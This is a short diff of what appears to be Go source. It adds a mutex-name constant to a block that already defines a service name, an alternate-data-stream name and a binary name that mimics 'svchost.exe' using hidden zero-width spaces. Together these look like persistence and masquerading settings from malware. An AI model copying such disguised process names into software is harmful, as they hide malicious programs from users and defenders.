@@ -10,6 +10,8 @@ const (
 	Ads     = "blueberry"
 	Binary  = "s\u200bvch\u200bost.exe"
 	Service = "Memserv2"
+
+	Mutex = "ThisIsTotallyRandom"
 )
 
 var (
